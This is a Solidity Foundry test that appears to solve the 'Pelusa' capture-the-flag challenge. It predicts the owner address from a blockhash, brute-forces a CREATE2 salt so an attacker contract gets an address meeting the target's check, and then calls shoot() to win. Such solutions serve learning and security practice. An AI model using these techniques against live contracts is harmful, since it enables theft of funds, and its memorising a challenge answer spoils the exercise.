// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "../src/attackers/PelusaAttacker.sol";

contract PelusaTest is Test {
    Pelusa public target;
    address public player;
    Factory public factory;

    function setUp() public {
        player = vm.addr(1);
        factory = new Factory();
        vm.label(player, "Player");
    }

    function testPelusa() public {
        vm.startPrank(player, player);
        target = new Pelusa();

        address owner = address(
            uint160(
                uint256(
                    keccak256(abi.encodePacked(player, blockhash(block.number)))
                )
            )
        );

        bytes32 salt = getSalt(address(target), owner);

        factory.deploy(address(target), owner, salt);

        target.shoot();

        assertTrue(target.goals() == 2);

        vm.stopPrank();
    }

    function getSalt(address _victim, address _owner)
        private
        returns (bytes32)
    {
        uint256 salt = 0;

        bytes memory bytecode = abi.encodePacked(
            type(PelusaAttacker).creationCode,
            abi.encode(_victim, _owner)
        );

        while (true) {
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(factory),
                    salt,
                    keccak256(bytecode)
                )
            );

            address precomputedAddress = address(uint160(uint256(hash)));

            if (uint256(uint160(precomputedAddress)) % 100 == 10) {
                console.log("Found address", precomputedAddress);
                break;
            }

            salt += 1;
        }

        return bytes32(salt);
    }
}
